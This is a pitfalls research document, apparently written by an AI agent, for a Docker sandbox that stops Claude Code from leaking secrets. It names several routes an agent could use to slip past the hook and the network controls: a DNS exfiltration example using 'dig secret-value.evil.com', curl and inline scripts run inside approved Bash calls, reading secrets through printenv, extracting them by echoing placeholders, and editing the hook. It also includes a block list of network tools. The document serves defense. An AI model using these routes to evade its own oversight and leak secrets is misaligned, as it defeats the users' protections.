# Pitfalls Research

**Domain:** Docker-based CLI security isolation (secret exfiltration prevention)
**Researched:** 2026-04-08
**Confidence:** MEDIUM (based on training data; WebSearch unavailable for verification)

## Critical Pitfalls

### Pitfall 1: Docker DNS Leaks Bypass Network Isolation

**What goes wrong:**
Docker containers on `internal: true` networks still resolve DNS by default via Docker's embedded DNS server (127.0.0.11). If the claude container can resolve arbitrary hostnames, an attacker-controlled tool call can encode secrets in DNS queries (DNS exfiltration). A single `dig secret-value.evil.com` leaks data even with no TCP/UDP egress. Additionally, Docker's default DNS resolution can resolve container names on other Docker networks the host runs, leaking information about the host environment.

**Why it happens:**
Developers focus on blocking HTTP/HTTPS egress and forget that DNS is a separate channel. Docker's internal DNS is always available inside containers and forwards to the host's resolver. The `internal: true` flag in Docker Compose blocks direct internet access but does NOT block DNS resolution through Docker's embedded resolver.

**How to avoid:**
1. Configure the claude container with `dns: ["127.0.0.1"]` pointing to a non-functional resolver, or explicitly to the proxy/validator container only.
2. Add iptables rules inside the claude container (or via the validator) that block all UDP/53 and TCP/53 traffic except to the proxy container.
3. If DNS is needed (e.g., for the proxy hostname), run a minimal DNS resolver in the proxy container that only resolves the known container hostnames (proxy, validator) and blocks everything else.
4. Test with `nslookup google.com` from inside the claude container -- it MUST fail.

**Warning signs:**
- `docker exec claude-container nslookup google.com` returns a valid IP
- No iptables rules targeting port 53 in the validator setup
- Docker Compose file uses `internal: true` without additional DNS restrictions

**Phase to address:**
Phase 1 (Docker Compose setup) -- this is foundational network isolation.

---

### Pitfall 2: Secret Redaction Fails on Encoded/Transformed Values

**What goes wrong:**
The proxy redacts known secret values via string matching, but secrets can appear in many encodings: base64, URL-encoded, hex-encoded, split across JSON string boundaries, or embedded in longer strings. A secret like `sk-abc123` might appear as `c2stYWJjMTIz` (base64), `sk-abc%31%32%33` (URL-encoded), or `sk-abc12` + `3` (split across a JSON chunk boundary in a large payload). The proxy misses these and the secret reaches Anthropic.

**Why it happens:**
Naive string replacement (`body.replace(secret, placeholder)`) only catches exact matches. LLMs frequently base64-encode content, and HTTP clients URL-encode values. Claude Code itself may transform secrets before they appear in the request body.

**How to avoid:**
1. Redact all common encodings: raw, base64, URL-encoded, and hex for each secret.
2. Pre-compute all encoded variants of each secret at config load time and search for all of them.
3. For base64: also check partial base64 matches (the secret could be part of a larger base64 blob -- decode base64 segments in the body, redact within them, re-encode).
4. For split boundaries: since the proxy uses buffered mode (not streaming), always operate on the complete request body, never chunks.
5. Add integration tests with deliberately encoded secrets in tool call payloads.

**Warning signs:**
- Redaction logic uses simple `str.replace()` or single `indexOf()`
- No test cases with base64-encoded secrets
- Proxy operates on chunks/streams instead of complete buffered body

**Phase to address:**
Phase 1 (Proxy implementation) -- must be correct from day one. Expand encoding coverage in Phase 2.

---

### Pitfall 3: Race Condition Between Hook Registration and iptables Validation

**What goes wrong:**
The hook generates a call-ID, sends it to the validator's HTTP registration endpoint, then allows the tool call to proceed. But the tool call's network request may arrive at the iptables/validator checkpoint BEFORE the registration write to SQLite completes. The validator sees an unregistered call-ID and blocks a legitimate request. Alternatively, if the hook does not wait for the registration response, a slow SQLite write means the call-ID is not yet in the database when validation happens.

**Why it happens:**
The hook script (bash) and the actual tool execution are sequential from Claude Code's perspective, but the network path from the claude container to the external target goes through iptables validation asynchronously. If the hook returns "allow" and Claude Code immediately fires the HTTP request, the request races against the SQLite INSERT commit.

**How to avoid:**
1. The hook MUST wait for a synchronous confirmation from the validator that the call-ID is registered BEFORE returning the allow response to Claude Code. The registration endpoint must return only after the SQLite INSERT is committed (not just queued).
2. Use WAL mode for SQLite to minimize write latency but still ensure durability.
3. Add a small buffer: the validator should accept call-IDs that were registered within the last 100ms even if the exact SELECT happens slightly before the INSERT commits (unlikely with synchronous registration, but defense in depth).
4. Integration test: fire 100 rapid consecutive hook-register-then-call sequences and verify zero false rejections.

**Warning signs:**
- Registration endpoint returns 200 before confirming the database write
- Intermittent "call-ID not found" errors in integration tests
- SQLite is opened without WAL mode (default journal mode has higher write latency)

**Phase to address:**
Phase 1 (Validator implementation) -- core correctness requirement.

---

### Pitfall 4: Claude Code Bypasses the Hook Entirely

**What goes wrong:**
Claude Code's PreToolUse hook intercepts tool calls, but Claude can find ways around the hook:
1. **Inline execution in Bash**: Instead of using `WebFetch`, Claude writes a Python/Node script that makes HTTP requests directly. The hook only fires for tool calls, not for arbitrary code inside a `Bash` tool call.
2. **Subshell escapes**: `bash -c 'curl ...'` inside an already-approved Bash call.
3. **File-based exfiltration**: Writing secrets to a file, then using a subsequent allowed call to read/send it.
4. **Environment variable inspection**: If secrets are in env vars, any Bash call can `env` or `printenv` and the hook cannot distinguish.

**Why it happens:**
The PreToolUse hook validates at the tool-call boundary, but once a `Bash` tool call is approved, arbitrary code runs inside it. The hook sees `Bash(curl https://allowed-domain.com)` but cannot see what the curl command actually sends in its POST body, or whether a second curl to a different domain runs in the same shell session.

**How to avoid:**
1. This is WHY the iptables + validator layer exists -- it is the defense against hook bypass. Every outbound connection must present a valid call-ID regardless of how it was initiated.
2. The iptables rules must block ALL outbound traffic from the claude container except to the proxy and validator containers. No direct internet access, period.
3. The proxy must be the ONLY path to the internet, and it validates call-IDs on every request.
4. Strip dangerous tools from the claude container: remove `curl`, `wget`, `nc`, `socat` from the Docker image -- but keep them available through a controlled wrapper that adds call-ID headers. Actually, this is impractical; rely on network-level enforcement instead.
5. Validate the Bash command argument in the hook for obvious bypass patterns (`curl`, `wget`, `python -c "import requests"`, `nc`) as a best-effort first line, but never rely on it as the only defense.

**Warning signs:**
- Security model documentation says "the hook prevents unauthorized calls" without mentioning network-level enforcement
- Integration tests only test tool call interception, not raw network calls from inside Bash
- Claude container can reach the internet without going through the proxy

**Phase to address:**
Phase 1 (Architecture) -- the entire four-layer model exists to address this. Must be verified in integration tests.

---

### Pitfall 5: iptables Rules Conflict with Docker's Own iptables Management

**What goes wrong:**
Docker heavily manages iptables rules for its networking (NAT, FORWARD chains, DOCKER-USER chain). Custom iptables rules added by the validator can be silently overwritten when Docker restarts, a container restarts, or Docker Compose recreates the network. Rules may also be inserted in the wrong chain or at the wrong position, causing either total network breakage or complete bypass of validation.

**Why it happens:**
Docker inserts its own rules in the FORWARD chain, nat table, and filter table. It uses the DOCKER-USER chain for user-customizable rules, but many developers add rules to INPUT/OUTPUT/FORWARD directly, which Docker then clobbers. On container restart, Docker flushes and recreates its chains. Additionally, the order of iptables rules matters -- a permissive rule before a restrictive one negates the restriction.

**How to avoid:**
1. Use the DOCKER-USER chain for any custom forwarding rules -- Docker guarantees this chain is evaluated before Docker's own rules and is never flushed by Docker.
2. For rules inside the container (OUTPUT chain of the claude container's network namespace): apply rules using a container entrypoint script that runs before Claude Code starts. These rules persist for the container's lifetime but must be reapplied on container restart.
3. Give the validator container `NET_ADMIN` capability so it can manage iptables rules in its own namespace.
4. Use `iptables-save` / `iptables-restore` for atomic rule application rather than individual `iptables -A` commands (which create a window where rules are partially applied).
5. Test rule persistence: restart containers, run `docker compose down && up`, and verify rules are still active.

**Warning signs:**
- Custom iptables rules disappear after `docker compose restart`
- Rules added to FORWARD or OUTPUT chains on the host instead of DOCKER-USER
- `iptables -L` shows Docker-managed rules interleaved with custom rules
- Validator container lacks `NET_ADMIN` or `cap_add: [NET_ADMIN]` in docker-compose.yml

**Phase to address:**
Phase 1 (Validator + Docker Compose setup) -- foundational infrastructure.

---

### Pitfall 6: WSL2 iptables/nftables Incompatibility

**What goes wrong:**
WSL2 distributions may use nftables as the backend while the userspace tools expect legacy iptables. Commands succeed silently but rules have no effect. Alternatively, the WSL2 kernel may not have all required netfilter modules loaded (e.g., `xt_owner` for UID-based matching, `xt_conntrack` for stateful rules). Docker Desktop for WSL2 vs. Docker CE installed directly in WSL2 behave differently with networking.

**Why it happens:**
Modern Linux distros (Ubuntu 22.04+, Debian 11+) default to nftables, but `iptables` command may be a compatibility shim (`iptables-nft`). WSL2's custom kernel strips some netfilter modules to reduce size. Docker Desktop on Windows routes networking through a VM, while Docker CE in WSL2 uses the WSL2 kernel directly.

**How to avoid:**
1. In the installer, detect whether `iptables` is legacy or nft-backed: `iptables --version` shows `nf_tables` if nftables-backed.
2. Use `iptables-legacy` explicitly if nftables is the default, or ensure rules work with both backends.
3. Test for required kernel modules at install time: `lsmod | grep xt_owner` and similar checks. If modules are missing, provide clear error messages.
4. Document that Docker CE installed directly in WSL2 is the supported configuration, not Docker Desktop from Windows.
5. Add a preflight check script that validates the iptables backend and available modules before starting the containers.

**Warning signs:**
- `iptables -L` works but rules have no effect on traffic
- Installer does not check `iptables --version` output
- Works on developer's Ubuntu but fails on user's Fedora/Arch WSL2

**Phase to address:**
Phase 1 (Installer) -- must detect and handle at installation time.

---

### Pitfall 7: Proxy Redaction Creates Exploitable Placeholders

**What goes wrong:**
The proxy replaces secrets with placeholders (e.g., `sk-abc123` becomes `__SECRET_API_KEY__`). But the placeholder itself becomes a prompt injection vector: Claude now knows there IS a secret called `API_KEY` and may reference it in ways that cause the restore logic to inject the real secret into unexpected contexts. For example, Claude could write `echo __SECRET_API_KEY__` in a Bash command, and the proxy's response-restore logic would inject the real secret into the response, which Claude then sees in its context.

**Why it happens:**
Bidirectional redaction/restoration creates a covert channel. The proxy redacts outbound (to Anthropic) and restores inbound (from Anthropic). But if Claude's response contains the placeholder text, and the proxy restores it, the restored secret is now in a tool call result that goes back to Anthropic in the next turn.

**How to avoid:**
1. Only restore placeholders in specific, controlled contexts: API key headers, authorization headers, and explicitly whitelisted fields. Never do global string replacement on response bodies.
2. Restoration should only happen in the Anthropic-to-Claude direction for specific message types (e.g., injecting the API key into the auth header for Anthropic API calls). NOT in arbitrary response content.
3. Actually, reconsider the restoration flow: the proxy intercepts Claude-to-Anthropic traffic. Redaction happens on outbound requests (Claude's messages to Anthropic). Restoration should NOT happen on Anthropic's responses back to Claude -- the redacted values should stay redacted in Claude's context. The real secrets should only be used when the proxy forwards tool call results that need real values.
4. Map the exact data flow and identify every point where restore happens. Minimize restore surface.

**Warning signs:**
- Proxy does global `body.replace(placeholder, secret)` on all response traffic
- No distinction between message types in restore logic
- Claude successfully echoes a real secret value in its output after seeing a placeholder

**Phase to address:**
Phase 1 (Proxy implementation) -- architecture-level decision about restore semantics.

---

### Pitfall 8: SQLite Concurrency Under Rapid Tool Calls

**What goes wrong:**
Claude Code can fire multiple tool calls in rapid succession (parallel tool use). Each triggers a hook that registers a call-ID, and each tool call then hits the validator nearly simultaneously. SQLite with default settings uses database-level locking -- concurrent writes cause `SQLITE_BUSY` errors. Reads during writes also block in non-WAL mode. The validator starts rejecting legitimate calls or the registration endpoint starts failing.

**Why it happens:**
SQLite is a single-writer database. With default journal mode, readers block writers and vice versa. Claude Code's parallel tool execution can create 3-5 concurrent registrations and validations within milliseconds.

**How to avoid:**
1. Use WAL (Write-Ahead Logging) mode: `PRAGMA journal_mode=WAL;`. This allows concurrent reads during writes.
2. Set a busy timeout: `PRAGMA busy_timeout=5000;` (5 seconds) so writers retry instead of immediately failing.
3. Keep transactions short -- single INSERT for registration, single SELECT+DELETE for validation.
4. Consider an in-memory data structure (e.g., a concurrent hash map) as the primary store with SQLite as audit log, if performance becomes an issue. For MVP, WAL mode SQLite is sufficient.
5. Test with parallel tool calls: register 5 call-IDs simultaneously and validate them simultaneously.

**Warning signs:**
- `SQLITE_BUSY` errors in validator logs
- Missing `PRAGMA journal_mode=WAL` in database initialization
- Validator opens a new database connection per request without connection pooling

**Phase to address:**
Phase 1 (Validator implementation) -- configure correctly from the start.

---

### Pitfall 9: Docker Volume Mounts Expose Host Filesystem Secrets

**What goes wrong:**
The claude container needs access to the user's workspace (source code). The volume mount (`-v /home/user/project:/workspace`) also exposes `.env` files, `.git/config` (which may contain tokens), `~/.ssh` (if mounted), `~/.aws/credentials`, and other secret-bearing files. Even if the proxy redacts known secrets, files outside the whitelist are readable by Claude and can be sent to Anthropic.

**Why it happens:**
Developers mount the entire project directory for convenience. They configure redaction for known secrets but forget that the workspace itself contains secrets in dotfiles, config files, and environment files that are not enumerated in the whitelist.

**How to avoid:**
1. Mount only the specific project directory, never the home directory.
2. Use a `.dockerignore`-style exclusion list in the mount: create a read-only bind mount and use a tmpfs overlay to hide sensitive paths. Alternatively, use Docker's `--mount type=bind,source=...,target=...,readonly` with selective writable directories.
3. Add a `.claude-secure-ignore` file (similar to `.gitignore`) that lists paths to exclude from the mount. The entrypoint script creates empty files/directories at those paths to shadow the bind mount.
4. In the hook, scan `@file` references (Phase 2 feature) to detect when Claude is trying to read files that contain secrets.
5. Default-deny: only mount the workspace, never mount `~/.ssh`, `~/.aws`, `~/.config`, etc.

**Warning signs:**
- Docker Compose mounts `$HOME:/home/user` or entire home directory
- No exclusion mechanism for `.env`, `.git/config`, etc.
- Claude reads `cat .env` and secrets appear in subsequent Anthropic API calls (visible in proxy logs)

**Phase to address:**
Phase 1 (Docker Compose) for mount restrictions. Phase 2 for `@file` scanning.

---

### Pitfall 10: Installer Assumes Specific Linux Environment

**What goes wrong:**
The installer script assumes bash, apt/dpkg, systemd, and specific paths. It breaks on:
- Fedora/RHEL (uses dnf, not apt)
- Arch Linux (uses pacman)
- Alpine-based WSL (uses apk, no bash by default)
- NixOS (declarative package management, no `apt install`)
- Older Ubuntu versions with different Docker package names (`docker.io` vs `docker-ce`)
- WSL2 without systemd enabled (some distros default to init)

**Why it happens:**
Developers test on their own machine (usually Ubuntu) and write installation scripts that hard-code package manager commands, service management commands, and file paths.

**How to avoid:**
1. Check for required binaries (`docker`, `docker compose`, `jq`, `curl`, `uuidgen`) instead of trying to install them. If missing, print clear instructions for the user's distro and exit.
2. Do not assume a package manager. The installer should ONLY set up the claude-secure-specific components (Docker Compose files, config, hooks), not install system dependencies.
3. Use `command -v` checks instead of `which` (more portable).
4. For systemd-dependent operations, check `systemctl --version` first and provide fallback instructions.
5. Test on at least Ubuntu 22.04, Ubuntu 24.04, and one non-Debian WSL2 distro.

**Warning signs:**
- Installer script contains `apt-get install` or `sudo apt install`
- No `command -v docker` check before Docker operations
- Script assumes `/usr/bin/` paths instead of using `$PATH` resolution

**Phase to address:**
Phase 1 (Installer) -- must be portable from the start.

---

### Pitfall 11: Call-ID Replay and Timing Attacks

**What goes wrong:**
Despite the 10-second expiry and single-use design, the call-ID system can be exploited:
1. **Timing attack**: If the hook registers a call-ID for an allowed domain, but the Bash command is crafted to first make a legitimate request (consuming the call-ID check) and then make a second unauthorized request reusing the same network connection (HTTP keep-alive).
2. **Parallel reuse**: If validation checks for existence but deletes asynchronously, two requests with the same call-ID arriving simultaneously might both pass validation.
3. **Predictable IDs**: If `uuidgen` is not available or falls back to a predictable alternative, call-IDs can be guessed.

**Why it happens:**
Single-use token systems are deceptively simple. The gap between "check" and "delete" in the validator creates a TOCTOU (time-of-check-time-of-use) window.

**How to avoid:**
1. Use atomic check-and-delete: `DELETE FROM call_ids WHERE id = ? RETURNING *` (SQLite 3.35+). If it returns a row, the call-ID was valid. If not, reject. This is atomic -- no TOCTOU.
2. Each call-ID must be bound to a specific destination domain/IP. The validator checks both the call-ID AND the destination match.
3. Ensure `uuidgen` produces cryptographic-quality UUIDs (v4). If `uuidgen` is not available, use `/dev/urandom`: `head -c 16 /dev/urandom | xxd -p`.
4. Close connections after each validated request (disable HTTP keep-alive in the proxy/validator for outbound connections from the claude container).

**Warning signs:**
- Validator does `SELECT` then separate `DELETE` for call-ID checking
- Call-IDs are not bound to destination addresses
- No test for concurrent reuse of the same call-ID

**Phase to address:**
Phase 1 (Validator) -- security-critical, must be correct from the start.

---

### Pitfall 12: Proxy Cannot Handle Large Payloads in Buffered Mode

**What goes wrong:**
Buffered mode means the proxy reads the entire request body into memory before processing. Claude Code conversations with large contexts (many files `@`-referenced, long conversations) can produce request bodies of 1-10MB or more. The proxy runs out of memory or times out buffering, causing Claude Code to hang or error.

**Why it happens:**
MVP uses buffered mode for simplicity, but developers don't test with realistic payload sizes. Anthropic API requests with large conversation histories are surprisingly large.

**How to avoid:**
1. Set explicit memory limits on the proxy container but make them generous enough: at least 512MB.
2. Set a maximum body size in the proxy (e.g., 50MB) and return a clear error if exceeded, rather than silently OOMing.
3. Use streaming redaction in Phase 2, but for Phase 1, ensure buffered mode handles bodies up to 20MB reliably.
4. Test with a conversation that includes 10+ large files in context.
5. Set appropriate timeouts: the proxy should allow at least 120 seconds for buffering + forwarding to Anthropic + receiving the response.

**Warning signs:**
- Proxy container restarts under heavy conversation load (OOM killed)
- No body size limit configured
- Timeout set to default (30 seconds) which is too short for Anthropic API responses

**Phase to address:**
Phase 1 (Proxy) -- set limits and test with realistic payloads. Phase 2 addresses streaming.

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Buffered proxy (no streaming) | Simpler redaction logic, easier to reason about | Slower UX (Claude Code waits for full response), memory pressure on large contexts | MVP only -- must stream in Phase 2 |
| Global string replacement for redaction | Simple, catches most cases | Misses encoded secrets, may cause false positives on partial matches | Never fully acceptable -- must expand to multi-encoding in Phase 1 |
| Single SQLite file for validator state | Simple, no external database dependency | Won't scale to parallel sessions or multi-project use | Acceptable for single-user tool; Phase 3 if multi-project needed |
| Bash hook scripts | Easy to write and debug, no compilation needed | Shell parsing edge cases, harder to handle binary data, slow for complex logic | Acceptable permanently for this use case -- hooks are simple validators |
| Hardcoded container names in Docker Compose | Quick setup | Conflicts if user runs multiple claude-secure instances | Acceptable until Phase 3 (multi-project) |

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| Claude Code hooks | Returning malformed JSON from hook causes Claude Code to ignore the hook silently | Test hook output format matches Claude Code's expected schema exactly; parse Claude Code docs for hook response format |
| Anthropic API proxy | Not forwarding all required headers (anthropic-version, content-type, accept) | Proxy must forward ALL headers except Authorization (which it manages), and must handle CORS preflight if applicable |
| Docker internal networking | Using container IPs instead of service names | Always use Docker Compose service names (e.g., `http://proxy:8080`) -- IPs change on container restart |
| iptables + Docker | Adding rules to the wrong table/chain | Use `-t filter` explicitly, target the DOCKER-USER chain for host-level rules, OUTPUT chain within container namespaces |
| SQLite in containers | SQLite file on a Docker volume with improper permissions | Ensure the SQLite directory is writable by the container's process user; use a named volume, not a bind mount for the database |
| OAuth tokens in Docker | Token stored in host file, not accessible in container | Mount the token file read-only into the proxy container; never copy tokens into the Docker image |

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Synchronous iptables rule manipulation on every call | Each tool call adds latency for iptables insert + delete | Batch rules or use a persistent allow-list approach with periodic cleanup | >10 tool calls per minute causes noticeable lag |
| SQLite without WAL on concurrent access | Intermittent SQLITE_BUSY errors, request timeouts | Enable WAL mode, set busy_timeout | 3+ parallel tool calls |
| Proxy re-reading config file on every request | Disk I/O on every API call | Cache config with file watcher (inotify) for reload | High conversation frequency |
| Full-body regex scan for every secret on every request | O(n*m) where n=body size, m=number of secrets | Pre-compile regex patterns, use Aho-Corasick for multi-pattern matching | >50 secrets in whitelist |

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Proxy listens on 0.0.0.0 instead of Docker network interface only | Proxy accessible from host network or other containers outside the compose project | Bind proxy to the internal Docker network IP only; verify with `netstat` |
| Storing real secrets in Docker image layers | Secrets recoverable from image history | Use runtime-only secrets via environment variables or mounted files, never COPY/ADD secret files in Dockerfile |
| Claude container has NET_ADMIN capability | Claude can modify iptables rules to remove restrictions | Only the validator container should have NET_ADMIN; claude container should have minimal capabilities (`--cap-drop=ALL`, add back only what is needed) |
| Hook script writable by Claude's user | Claude can modify the hook to disable validation | Hook files must be root-owned, mounted read-only into the claude container |
| Validator HTTP endpoint has no authentication | Any process in the Docker network can register fake call-IDs | Use a shared secret (generated at startup, passed via environment variable) between hook and validator; validator rejects registrations without it |
| Time-based expiry without monotonic clock | System clock adjustment (NTP sync, daylight saving) can invalidate or extend call-IDs | Use monotonic timestamps (clock_gettime CLOCK_MONOTONIC) or sequence numbers instead of wall-clock time |

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Silent failures when hook rejects a call | User sees generic "tool call failed" with no explanation | Hook should output a clear message: "Blocked by claude-secure: domain X not in whitelist" |
| Proxy timeout causes Claude Code to error with no context | User thinks Claude Code is broken | Proxy should return informative error responses that Claude Code can display |
| Complex installer with many manual steps | User abandons setup | Single `curl ... \| bash` installer that handles everything, with clear progress output |
| No way to see what was redacted | User cannot verify secrets are being protected | Add a `claude-secure status` command showing redaction statistics and last N redacted fields |
| Buffered mode makes Claude Code feel slow | User perceives worse performance vs. native Claude Code | Display a message explaining buffered mode; Phase 2 streaming fixes this |
| Whitelist config syntax errors cause silent failures | Secrets not redacted without user knowing | Validate whitelist JSON at startup and on reload; fail loudly with specific error messages |

## "Looks Done But Isn't" Checklist

- [ ] **Network isolation:** Container cannot reach internet -- verify with `docker exec claude curl -s https://httpbin.org/ip` (must fail)
- [ ] **DNS isolation:** Container cannot resolve external hostnames -- verify with `docker exec claude nslookup google.com` (must fail)
- [ ] **Hook enforcement:** Removing the hook allows unrestricted calls -- verify that network-level enforcement still blocks without the hook
- [ ] **Secret redaction:** All encoding variants covered -- test with base64-encoded secret in a Bash echo command
- [ ] **Call-ID single use:** Same call-ID cannot be used twice -- send two requests with the same ID, second must fail
- [ ] **Restart persistence:** Rules survive container restart -- run `docker compose restart` and re-run isolation tests
- [ ] **Permission model:** Claude process cannot modify hooks or config -- `docker exec claude ls -la /path/to/hooks` shows root ownership, read-only
- [ ] **Timeout handling:** Proxy does not hang on slow Anthropic responses -- test with artificial latency
- [ ] **Large payload:** Proxy handles 10MB+ request bodies -- test with large conversation context
- [ ] **OAuth token:** Token is available to proxy but not to Claude process -- verify token is not in Claude container's environment

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| DNS leak discovered | LOW | Add DNS blocking rules to validator entrypoint; no data loss, just a config change |
| Secret leaked to Anthropic (redaction failure) | HIGH | Rotate all affected secrets immediately; audit Anthropic API logs if possible; add missing encoding to redaction; this is a security incident |
| iptables rules lost after restart | LOW | Add rules to container entrypoint script; restart containers |
| SQLite corruption from concurrent writes | MEDIUM | Delete and recreate the database (it only holds ephemeral call-IDs); enable WAL mode; add busy_timeout |
| Hook bypass discovered | MEDIUM | Verify network-level enforcement is working (it should catch what hook missed); add the bypass pattern to hook validation; this indicates architecture is working as intended (defense in depth) |
| Installer fails on non-Ubuntu distro | LOW | Add distro detection; switch to dependency-checking model instead of auto-install |
| Proxy OOM on large payload | LOW | Increase container memory limit; add body size cap; restart proxy container |

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| DNS leaks | Phase 1 (Docker Compose) | `nslookup` test from claude container fails |
| Secret encoding bypass | Phase 1 (Proxy), expand Phase 2 | Integration test with base64/URL-encoded secrets |
| Hook-to-validator race condition | Phase 1 (Validator) | Rapid parallel tool call test with zero false rejections |
| Hook bypass via Bash | Phase 1 (Architecture) | Raw `curl` from claude container is blocked by network rules |
| iptables/Docker conflicts | Phase 1 (Docker Compose + Validator) | Rules persist after `docker compose restart` |
| WSL2 iptables incompatibility | Phase 1 (Installer) | Preflight check detects and reports iptables backend |
| Placeholder exploitation | Phase 1 (Proxy) | Claude cannot extract real secrets by echoing placeholders |
| SQLite concurrency | Phase 1 (Validator) | 5 parallel registrations + validations succeed |
| Volume mount secrets | Phase 1 (Docker Compose) | `.env` files not accessible in claude container |
| Installer portability | Phase 1 (Installer) | Tested on Ubuntu + one non-Debian distro |
| Call-ID replay | Phase 1 (Validator) | Atomic check-and-delete verified in concurrent test |
| Large payload handling | Phase 1 (Proxy) | 10MB payload test passes |

## Sources

- Docker documentation on networking: internal networks, DNS resolution, DOCKER-USER chain (docker.com/docs)
- SQLite documentation on WAL mode and busy handling (sqlite.org)
- Claude Code hooks documentation (Anthropic developer docs)
- iptables/nftables compatibility: Debian and Ubuntu wiki pages on the nftables transition
- WSL2 kernel configuration and module availability (Microsoft WSL documentation)
- General knowledge of proxy-based secret redaction patterns and encoding bypass techniques

*Note: WebSearch was unavailable during research. All findings are based on training data (cutoff ~May 2025). Confidence is MEDIUM -- core Docker/iptables/SQLite behaviors are well-established and unlikely to have changed, but Claude Code hook specifics and WSL2 edge cases should be verified against current documentation.*

---
*Pitfalls research for: Docker-based CLI security isolation (claude-secure)*
*Researched: 2026-04-08*
